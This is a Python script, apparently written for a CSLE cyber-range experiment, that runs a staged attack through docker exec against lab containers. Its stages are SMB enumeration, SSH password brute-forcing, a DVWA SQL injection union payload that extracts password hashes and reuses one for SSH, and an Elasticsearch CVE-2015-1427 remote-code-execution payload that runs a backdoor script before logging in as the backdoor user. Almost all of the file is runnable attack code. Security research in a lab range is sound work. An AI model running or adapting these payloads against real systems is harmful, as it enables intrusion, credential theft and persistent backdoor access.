#!/usr/bin/env python3
"""Run a visible no-helper level9 experienced-like attack on DT16.

This intentionally does not call CSLE helper exploit scripts.  It executes
plain shell/curl/ssh commands and prints the evidence needed to decide
logged_in/root from the running process itself.
"""

from __future__ import annotations

import json
import re
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


REPO_ROOT = Path(__file__).resolve().parents[2]
OUT_DIR = REPO_ROOT / "experiments" / "csle_level9_dt" / "artifacts" / "model_outputs"


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")


def docker_exec(container: str, command: str, timeout: int = 180) -> dict[str, Any]:
    print(f"\n--- docker exec {container} ---", flush=True)
    print(command, flush=True)
    started = utc_now()
    try:
        proc = subprocess.run(
            ["docker", "exec", container, "bash", "-lc", command],
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            timeout=timeout,
            check=False,
        )
        result = {
            "container": container,
            "command": command,
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "started_at_utc": started,
            "ended_at_utc": utc_now(),
            "timeout": False,
        }
    except subprocess.TimeoutExpired as exc:
        result = {
            "container": container,
            "command": command,
            "returncode": 124,
            "stdout": exc.stdout or "",
            "stderr": exc.stderr or f"timeout after {timeout}s",
            "started_at_utc": started,
            "ended_at_utc": utc_now(),
            "timeout": True,
        }

    print(f"returncode={result['returncode']}", flush=True)
    if result["stdout"]:
        print("--- stdout ---", flush=True)
        print(result["stdout"][-6000:], flush=True)
    if result["stderr"]:
        print("--- stderr ---", flush=True)
        print(result["stderr"][-6000:], flush=True)
    return result


def login_root_from_output(output: str, marker: str) -> tuple[bool, bool, dict[str, Any]]:
    logged_in = marker in output
    uid_match = re.search(r"__ID_U__\s*\n?([0-9]+)", output)
    sudo_match = re.search(r"__SUDO_N_ID_U__\s*\n?([0-9]+)", output)
    whoami_match = re.search(r"__WHOAMI__\s*\n?([A-Za-z0-9_.-]+)", output)
    login_uid = uid_match.group(1) if uid_match else None
    sudo_uid = sudo_match.group(1) if sudo_match else None
    root = bool(logged_in and (login_uid == "0" or sudo_uid == "0"))
    return logged_in, root, {"login_uid": login_uid, "sudo_uid": sudo_uid, "whoami": whoami_match.group(1) if whoami_match else None}


def main() -> int:
    hacker = "csle_hacker_kali_1_1-level9-16"
    samba = "csle_samba_2_1-level9-16"
    dvwa = "csle_sql_injection_1_1-level9-16"

    phases: list[dict[str, Any]] = []

    smb_cmd = (
        "smbclient -L //16.9.2.3 -N -m SMB3 || "
        "smbclient -L //16.9.2.3 -N -m SMB2 || true; "
        "nmap -Pn -sT -p445 --script smb-protocols,smb-os-discovery 16.9.2.3 || true"
    )
    smb_result = docker_exec(hacker, smb_cmd, timeout=90)
    phases.append(
        {
            "phase": "smb_probe",
            "result": smb_result,
            "judgment": {
                "logged_in": False,
                "root": False,
                "reason": "SMB enumeration/probe only; no shell/login/root marker is executed.",
            },
        }
    )

    ssh_cmd = r'''
WORDLIST=/SecLists/Usernames/top-usernames-shortlist.txt
echo "__SSH_BRUTE_START__"
if [ ! -f "$WORDLIST" ]; then echo "__WORDLIST_MISSING__ $WORDLIST"; exit 10; fi
attempt=0
for u in $(cat "$WORDLIST"); do
  for p in $(cat "$WORDLIST"); do
    attempt=$((attempt+1))
    out=$(timeout 8 sshpass -p "$p" ssh \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout=5 \
      "$u@16.9.2.78" \
      'echo __SSH_LOGIN_OK__; echo __ID_U__; id -u; echo __WHOAMI__; whoami; echo __SUDO_N_ID_U__; sudo -n id -u' 2>&1)
    rc=$?
    if echo "$out" | grep -q "__SSH_LOGIN_OK__"; then
      echo "__SSH_FOUND__ attempt=$attempt username=$u password=$p rc=$rc"
      echo "$out"
      exit 0
    fi
  done
done
echo "__SSH_NOT_FOUND__ attempts=$attempt"
exit 2
'''
    ssh_result = docker_exec(samba, ssh_cmd, timeout=240)
    ssh_out = (ssh_result["stdout"] or "") + "\n" + (ssh_result["stderr"] or "")
    ssh_logged, ssh_root, ssh_detail = login_root_from_output(ssh_out, "__SSH_LOGIN_OK__")
    phases.append(
        {
            "phase": "ssh_password_guessing_from_samba",
            "result": ssh_result,
            "judgment": {
                "target": "16.9.2.78",
                "route": "csle_samba_2_1-level9-16 -> 16.9.2.78",
                "logged_in": ssh_logged,
                "root": ssh_root,
                "detail": ssh_detail,
            },
        }
    )

    dvwa_cmd = r'''
COOKIE=/tmp/codex_visible_dvwa_cookie.txt
rm -f "$COOKIE" /tmp/codex_visible_dvwa_sqli.html
echo "__DVWA_LOGIN_START__"
curl -s -i -c "$COOKIE" -b "$COOKIE" \
  -d 'username=admin&password=password&Login=Login' \
  -X POST 'http://16.9.4.74/login.php' | sed -n '1,20p'
echo "__DVWA_SQLI_START__"
curl -s --location -c "$COOKIE" -b "$COOKIE" \
  'http://16.9.4.74/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28user%2C%27%3A%27%2Cpassword%29+from+users+%23&Submit=Submit#' \
  -o /tmp/codex_visible_dvwa_sqli.html
grep -Eo '[A-Za-z0-9_]+:[a-f0-9]{32}' /tmp/codex_visible_dvwa_sqli.html | sort -u || true
PABLO_PW=$(grep -Eo 'pablo:[a-f0-9]{32}' /tmp/codex_visible_dvwa_sqli.html | head -n1 | cut -d: -f2)
if [ -z "$PABLO_PW" ]; then echo "__PABLO_HASH_NOT_FOUND__"; exit 3; fi
echo "__PABLO_HASH_FOUND__ $PABLO_PW"
sshpass -p "$PABLO_PW" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=5 \
  pablo@16.9.4.74 \
  'echo __DVWA_SSH_LOGIN_OK__; echo __ID_U__; id -u; echo __WHOAMI__; whoami; echo __SUDO_N_ID_U__; sudo -n id -u' 2>&1
'''
    dvwa_result = docker_exec(samba, dvwa_cmd, timeout=120)
    dvwa_out = (dvwa_result["stdout"] or "") + "\n" + (dvwa_result["stderr"] or "")
    dvwa_logged, dvwa_root, dvwa_detail = login_root_from_output(dvwa_out, "__DVWA_SSH_LOGIN_OK__")
    phases.append(
        {
            "phase": "dvwa_sqli_from_samba",
            "result": dvwa_result,
            "judgment": {
                "target": "16.9.4.74",
                "route": "csle_samba_2_1-level9-16 -> 16.9.4.74",
                "logged_in": dvwa_logged,
                "root": dvwa_root,
                "detail": dvwa_detail,
            },
        }
    )

    es_cmd = r'''
echo "__ES_PREFLIGHT__"
if ! timeout 4 bash -lc '</dev/tcp/16.9.5.62/9200' >/dev/null 2>&1; then
  echo "__ES_9200_CLOSED__"
else
  echo "__ES_9200_OPEN__"
  curl -s -XPOST 'http://16.9.5.62:9200/_search?pretty' \
    -H 'Content-Type: application/json' \
    -d '{"script_fields":{"myscript":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"/create_backdoor_cve_2015_1427.sh\").getText()"}}}'
fi
echo "__ES_BACKDOOR_LOGIN_TEST__"
sshpass -p cve_2015_1427_pwnedpw ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=5 \
  ssh_backdoor_cve_2015_1427_pwned@16.9.5.62 \
  'echo __ES_SSH_LOGIN_OK__; echo __ID_U__; id -u; echo __WHOAMI__; whoami; echo __SUDO_N_ID_U__; sudo -n id -u' 2>&1
'''
    es_result = docker_exec(dvwa, es_cmd, timeout=120)
    es_out = (es_result["stdout"] or "") + "\n" + (es_result["stderr"] or "")
    es_logged, es_root, es_detail = login_root_from_output(es_out, "__ES_SSH_LOGIN_OK__")
    phases.append(
        {
            "phase": "elasticsearch_cve_2015_1427_from_dvwa",
            "result": es_result,
            "judgment": {
                "target": "16.9.5.62",
                "route": "csle_sql_injection_1_1-level9-16 -> 16.9.5.62",
                "exploit_endpoint_open": "__ES_9200_OPEN__" in es_out,
                "logged_in": es_logged,
                "root": es_root,
                "detail": es_detail,
                "attribution_note": "If 9200 is closed, SSH login proves an existing backdoor is usable, not that this CVE request created it.",
            },
        }
    )

    summary = [
        {"phase": phase["phase"], **phase["judgment"]}
        for phase in phases
    ]
    output = {
        "kind": "codex_visible_no_helper_attack_run",
        "created_at_utc": utc_now(),
        "summary": summary,
        "phases": phases,
    }
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    out_file = OUT_DIR / f"codex_visible_no_helper_attack_execution16_{ts()}.json"
    out_file.write_text(json.dumps(output, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    print("\n=== VISIBLE NO-HELPER SUMMARY ===", flush=True)
    print(json.dumps(summary, indent=2, ensure_ascii=False), flush=True)
    print(f"wrote {out_file}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
